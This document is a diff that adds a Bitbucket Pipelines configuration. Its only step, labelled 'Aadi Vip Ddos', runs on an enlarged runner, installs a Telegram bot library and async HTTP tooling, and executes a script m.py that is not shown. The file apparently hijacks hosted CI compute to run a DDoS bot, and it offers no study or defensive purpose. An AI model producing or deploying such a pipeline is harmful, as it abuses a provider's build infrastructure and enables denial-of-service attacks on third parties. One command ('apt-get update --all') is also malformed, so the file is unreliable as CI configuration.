@@ -1,0 +1,10 @@
+pipelines:
+  default:
+    - step:
+        name: AADI VIP
+        size: 4x
+        image: python:3.12
+        script:
+          - echo "Aadi Vip Ddos..."
+          - apt-get update && apt-get update --all && pip install --upgrade pip && pip install --upgrade requests
+          - pip install telebot pymongo aiohttp && chmod +x * && python3 m.py
